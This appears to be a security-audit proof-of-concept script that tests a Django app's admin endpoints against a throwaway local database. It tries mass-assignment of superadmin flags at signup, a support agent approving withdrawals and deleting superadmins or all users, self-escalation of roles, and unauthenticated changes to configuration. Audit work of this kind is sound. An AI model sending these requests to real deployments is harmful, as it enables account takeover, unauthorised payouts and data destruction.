"""PoC for admin-privilege audit — runs against a throwaway sqlite DB."""
import os, sys, json, tempfile

os.environ.setdefault("SECRET_KEY", "audit-poc-key-0123456789abcdef0123456789")
os.environ.setdefault("ENV", "dev")
os.environ.setdefault("DEBUG", "True")
os.environ.setdefault("DATABASE_URL", "sqlite:///" + os.path.join(tempfile.mkdtemp(), "poc.sqlite3"))
os.environ.setdefault("RESEND_API_KEY", "x")
os.environ.setdefault("SMTP_USER", "x")
os.environ.setdefault("SMTP_HOST", "localhost")
os.environ.setdefault("SMTP_PASSWORD", "x")
os.environ.setdefault("SMTP_PORT", "587")
sys.argv.append("test")  # keep APScheduler from starting

os.environ.setdefault("DJANGO_SETTINGS_MODULE", "urbana.settings")
import django
django.setup()

from django.core.management import call_command
call_command("migrate", run_syncdb=True, verbosity=0)

from rest_framework.test import APIClient
from apps.authentication.models import User

out = {}

def call(client, method, url, data=None):
    try:
        fn = getattr(client, method)
        r = fn(url, data, format="json") if data is not None else fn(url)
        try:
            body = r.json()
        except Exception:
            body = str(getattr(r, "data", r.status_code))[:200]
        return {"status": r.status_code, "body": body}
    except Exception as e:
        return {"EXC": f"{type(e).__name__}: {e}"[:300]}

# ---------- S1: self-service superadmin via /auth/signup ----------
r = call(APIClient(), "post", "/auth/signup", {
    "email": "attacker@evil.com", "password": "Password1!",
    "first_name": "Atk", "last_name": "One",
    "is_staff": True, "is_superuser": True, "is_active": True,
    "is_verified": True, "user_type": "admin", "admin_role": "superadmin",
})
out["S1_signup"] = r
u = User.objects.filter(email="attacker@evil.com").first()
out["S1_user_flags"] = {k: getattr(u, k, None) for k in
    ["is_staff", "is_superuser", "is_active", "is_verified", "user_type", "admin_role"]} if u else {"exists": False}

c = APIClient()
r = call(c, "post", "/auth/login", {"email": "attacker@evil.com", "password": "Password1!"})
tok = ((r.get("body") or {}).get("tokens") or {}).get("access")
c.credentials(HTTP_AUTHORIZATION=f"Bearer {tok}")
out["S1_login"] = {"status": r["status"], "got_token": bool(tok)}
out["S1_manage_customers"] = call(c, "get", "/manage/customers")["status"]
out["S1_manage_withdrawals"] = call(c, "get", "/manage/withdrawals")["status"]
out["S1_auth_users"] = call(c, "get", "/auth/users")["status"]
out["S1_django_admin_login_page"] = c.get("/admin/login/").status_code
c.credentials()

# ---------- S2: least-privileged staff (support_agent) ----------
support = User.objects.create_user(email="support@urbana.com", password="Password1!")
support.is_active = True; support.is_verified = True
support.is_staff = True; support.user_type = "admin"; support.admin_role = "support_agent"
support.save()
r = call(APIClient(), "post", "/auth/login", {"email": "support@urbana.com", "password": "Password1!"})
tok = ((r.get("body") or {}).get("tokens") or {}).get("access")
sc = APIClient(); sc.credentials(HTTP_AUTHORIZATION=f"Bearer {tok}")

out["S2_support_manage_customers"] = call(sc, "get", "/manage/customers")["status"]
out["S2_support_manage_withdrawals"] = call(sc, "get", "/manage/withdrawals")["status"]
out["S2_support_manage_orders"] = call(sc, "get", "/manage/orders")["status"]
out["S2_support_clevel_dash"] = call(sc, "get", "/manage/c-level-dashboard")["status"]
out["S2_support_anomalies"] = call(sc, "get", "/manage/anomalies")["status"]
out["S2_support_newsletter_send"] = call(sc, "post", "/manage/newsletters/1/send", {})["status"]

# withdrawal self-approve: create a withdrawal then mark_completed as support
from apps.pay.models import Withdrawal, Wallet
w_wallet = Wallet.objects.create(user=support, available_balance=0)
wd = Withdrawal.objects.create(wallet=w_wallet, user=support, amount=10, reference="POC-WD-1",
                               bank_name="T", bank_code="044", account_number="1", account_name="t")
out["S2_support_mark_withdrawal_completed"] = call(sc, "post", f"/manage/withdrawals/{wd.id}/mark_completed", {})
out["S2_support_fake_autopayout"] = call(sc, "post", f"/manage/withdrawals/{wd.id}/process_automated_payout", {})
wd.refresh_from_db()
out["S2_withdrawal_state"] = {"status": wd.status, "fw_id": wd.flutterwave_transfer_id}

# support agent deletes the superadmin
out["S2_delete_superadmin"] = call(sc, "post", "/auth/user/action", {"user_id": u.id, "action": "delete"})
out["S2_superadmin_exists_after"] = User.objects.filter(id=u.id).exists()

# support agent suspends a superadmin (recreate target first)
sa = User.objects.create_user(email="sa@urbana.com", password="Password1!")
sa.is_active = True; sa.is_staff = True; sa.user_type = "admin"; sa.admin_role = "superadmin"; sa.save()
out["S2_suspend_superadmin"] = call(sc, "post", "/auth/user/action", {"user_id": sa.id, "action": "toggle_active"})
sa.refresh_from_db(); out["S2_superadmin_active_after"] = sa.is_active

# support agent: delete all users (expected crash per source analysis)
n_security_before = None
from apps.authentication.models import Security
sec = Security.objects.create(user=sa)
out["S2_delete_all_users"] = call(sc, "post", "/auth/user/delete/all", {})
out["S2_user_count_after_delete_all"] = User.objects.count()
out["S2_security_rows_lost"] = not Security.objects.filter(id=sec.id).exists()

# self-escalation attempts
out["S2_self_change_admin_role"] = call(sc, "post", "/auth/user/action",
    {"user_id": support.id, "action": "change_admin_role", "admin_role": "superadmin"})
out["S2_change_own_user_type"] = call(sc, "post", "/auth/user/action",
    {"user_id": support.id, "action": "change_role", "role": "admin"})
support.refresh_from_db()
out["S2_support_admin_role_after"] = support.admin_role

# ---------- S3: unauthenticated ----------
anon = APIClient()
out["S3_manage_customers_anon"] = call(anon, "get", "/manage/customers")["status"]
out["S3_manage_withdrawals_anon"] = call(anon, "get", "/manage/withdrawals")["status"]
out["S3_algo_config_anon_patch"] = call(anon, "patch", "/manage/algorithm-config", {"market_stage": "scale"})["status"]
out["S3_delete_all_anon"] = call(anon, "post", "/auth/user/delete/all", {})["status"]
out["S3_fw_verify_account_anon"] = call(anon, "get", "/pay/fw/verify-account")["status"]

# ---------- S4: authenticated NON-staff (customer) ----------
cust = User.objects.create_user(email="cust@x.com", password="Password1!")
cust.is_active = True; cust.is_verified = True; cust.user_type = "customer"; cust.save()
r = call(APIClient(), "post", "/auth/login", {"email": "cust@x.com", "password": "Password1!"})
tok = ((r.get("body") or {}).get("tokens") or {}).get("access")
cc = APIClient(); cc.credentials(HTTP_AUTHORIZATION=f"Bearer {tok}")
out["S4_customer_manage_customers"] = call(cc, "get", "/manage/customers")["status"]
out["S4_customer_algo_config_get"] = call(cc, "get", "/manage/algorithm-config")["status"]
out["S4_customer_algo_config_patch"] = call(cc, "patch", "/manage/algorithm-config", {"market_stage": "scale", "weight_conversion": 0.99})
out["S4_customer_anomalies"] = call(cc, "get", "/manage/anomalies")["status"]

print("\n================ RESULTS ================")
print(json.dumps(out, indent=2, default=str))
